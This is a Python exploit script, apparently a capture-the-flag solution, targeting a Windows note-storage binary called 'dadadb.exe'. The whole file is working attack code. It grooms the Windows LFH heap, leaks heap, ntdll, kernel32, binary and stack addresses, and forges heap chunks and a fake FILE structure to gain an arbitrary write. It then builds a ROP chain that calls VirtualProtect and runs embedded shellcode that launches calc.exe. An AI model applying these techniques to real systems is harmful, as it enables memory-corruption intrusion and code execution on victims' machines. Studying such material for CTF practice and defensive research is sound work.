from winpwn import * 

def login(user,name):
    p.recvuntil(">>")
    p.sendline("1")
    p.recvuntil(":")
    p.sendline(user)
    p.recvuntil(":")
    p.sendline(name)

def add(key,size,data):
    p.recvuntil(">>")
    p.sendline("1")
    p.recvuntil(":")
    p.send(key)
    p.recvuntil(":")
    p.sendline(str(size))
    p.recvuntil(":")
    p.send(data)

def view(key):
    p.recvuntil(">>")
    p.sendline("2")
    p.recvuntil(":")
    p.send(key)

def free(key):
    p.recvuntil(">>")
    p.sendline("3")
    p.recvuntil(":")
    p.send(key)

def logout():
    p.recvuntil(">>")
    p.sendline("4")

def leak(addr) : 
    global key 
    add("dada14", 0x60, 'a' * 0x70 + p64(addr))
    view(key) 
    p.recvuntil("Data:")
    return p.recvuntil("ddaa")  

context.log_level = "debug"
p = process("dadadb.exe") 
login("ddaa","phdphd")

#Enable LFH
for i in range(19):
    add("lays" + str(i),0x90,"fuck")

#Fill UserBlock
for i in range(0x10): 
    add("dada" + str(i),0x90,"ggwp%i" % i)
free("dada15")
#Fill the hole with structure

add("dada14",0x60,'a'*0x70) #leak heap ptr
view("dada14")
p.recvuntil("a"*0x70)
heap = u64(p.recv(8)) & (~0xffff)

p.recv(8) 
key = p.recv(8).replace("\x00", '') 
print("HEAP = " + hex(heap))
print(repr("KEY = " + key))

ntdll = u64(leak(heap + 0x2c0)[:8]) - 0x163dd0
print("NTDLL = " + hex(ntdll))

# leak base address 
pebldr = 0x1653c0 + ntdll 
immol = pebldr + 0x20
ldrdata = u64(leak(immol)[:8])
bin_base = u64(leak(ldrdata + 0x20)[:8])
print("BINARY BASE = " + hex(bin_base)) 

# leak stack address 
peb = u64(leak(ntdll + 0x165348)[:8]) - 0x80 
teb = peb + 0x9000
stack = u64(leak(peb + 0x1010)[:8])
print("STACK = " + hex(stack)) 
ret_addr = bin_base+0x1b60
stack_end = stack + (0x10000 - (stack & 0xffff))
start = stack_end - 8
ret = 0 
for i in range(0x1000//8):
    addr = start - 8*i
    try : 
        v = u64(leak(addr)[:8])
        if v == ret_addr :
            ret = addr
            print("found!")
            break
    except : 
        continue

# leak kernel32 address 
iat = bin_base + 0x3000 
ReadFile = u64(leak(iat)[:8]) 
kernel32 = ReadFile - 0x22410 
virtual_protect = kernel32 + 0x1af90 

"""
arbitrary write 
create 5 chunk : 
A (0x100)
B (0x100)
C (0x100)
D (0x100)
E (0x100)
"""
shellcode = [0x48, 0x83, 0xec, 0x28, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x31, 0xdb, 0x65,
  0x48, 0x8b, 0x43, 0x60, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x8b, 0x70, 0x20,
  0x48, 0xad, 0x48, 0x96, 0x48, 0xad, 0x48, 0x8b, 0x58, 0x20, 0x4d, 0x31,
  0xc0, 0x44, 0x8b, 0x43, 0x3c, 0x4c, 0x89, 0xc2, 0x48, 0x01, 0xda, 0x48,
  0x31, 0xc9, 0xb1, 0x88, 0x44, 0x8b, 0x04, 0x0a, 0x49, 0x01, 0xd8, 0x4c,
  0x89, 0xc2, 0x48, 0x31, 0xf6, 0x8b, 0x72, 0x20, 0x48, 0x01, 0xde, 0x48,
  0x31, 0xc9, 0x49, 0xb9, 0x57, 0x69, 0x6e, 0x45, 0x78, 0x65, 0x63, 0x00,
  0x48, 0xff, 0xc1, 0x8b, 0x04, 0x8e, 0x48, 0x01, 0xd8, 0x4c, 0x39, 0x08,
  0x75, 0xf2, 0x48, 0x31, 0xf6, 0x8b, 0x72, 0x24, 0x48, 0x01, 0xde, 0x66,
  0x8b, 0x0c, 0x4e, 0x48, 0x31, 0xf6, 0x8b, 0x72, 0x1c, 0x48, 0x01, 0xde,
  0x8b, 0x04, 0x8e, 0x48, 0x01, 0xd8, 0x48, 0x31, 0xc9, 0xb9, 0x2e, 0x65,
  0x78, 0x65, 0x51, 0x48, 0xb9, 0x6d, 0x33, 0x32, 0x5c, 0x63, 0x61, 0x6c,
  0x63, 0x51, 0x48, 0xb9, 0x77, 0x73, 0x5c, 0x53, 0x79, 0x73, 0x74, 0x65,
  0x51, 0x48, 0xb9, 0x43, 0x3a, 0x5c, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x51,
  0x48, 0x89, 0xe1, 0x6a, 0x09, 0x5a, 0x48, 0xff, 0xc2, 0x48, 0x83, 0xec,
  0x30, 0xff, 0xd0] 
assert len(shellcode) <= 0xf0
add("AAAA", 0x200, 'aaaa')
add("AAAA", 0x100, 'aaaa')
add("BBBB", 0xf0, 'b' * 0x18)           # add 0x18  for easy debug 
add("CCCC", 0xf0, p64(0x0) + "".join(map(chr, shellcode)))
add("DDDD", 0xf0, 'dddd')
add("EEEE", 0xf0, 'eeee') 
free("DDDD")
free("BBBB") 

view("AAAA")
dump = p.recv(0x125)  
BBBB_bk = u64(dump[-8:]) 
BBBB_fd = u64(dump[-16:-8])
header = u64(dump[-24:-16]) 
BBBB = BBBB_fd - 0x200 
shellcode_addr = BBBB_fd - 0x100 + 8  
logout()

password = bin_base + 0x5658 
fake_user = "ddaa" + "\x00" * 4 + p64(header) + p64(0xdeadbeef) + p64(password)[:-2]
fake_password = "phdphd\x00\x00" + p64(header) + p64(password - 0x28) + p64(BBBB)[:-2]
login(fake_user, fake_password)
add("AAAA", 0x100, 'a' * 0x100 + p64(0) + p64(header) + p64(password) + p64(BBBB_bk))  
add('FFFF', 0xf0, 'ffff')   

cnt = 0
_ptr = 0
_base = ret
flag = 0x2080
fd = 0
bufsize = 0x100+0x10
fakefp = p64(_ptr) + p64(_base) + p32(cnt) + p32(flag) + p32(fd) + p32(0) + p64(bufsize) +p64(0)
fakefp += p64(0xffffffffffffffff) + p32(0xffffffff) + p32(0) + p64(0)*2
fakefp_address = password + 0x20
add("GGGG", 0xf0, 'a' * 0x10 + p64(fakefp_address) + p64(0) + fakefp) 

logout()
# context.windbg = "windbg64.exe" 
# windbg.attach(p, "bp " + hex(virtual_protect))
login('a', 'a') 



pop_rdx_rcx_r8_r9_r10_r11 = ntdll + 0x8c430
buf = bin_base + 0x5800
rop = ''
rop += p64(pop_rdx_rcx_r8_r9_r10_r11) 
rop += p64(0x1000) + p64(shellcode_addr) + p64(0x40) + p64(shellcode_addr - 8) + p64(0) * 2
rop += p64(virtual_protect)
rop += p64(shellcode_addr)
p.send(rop.ljust(0x100,'\x00')) 
# print(hex(BBBB))

p.interactive() 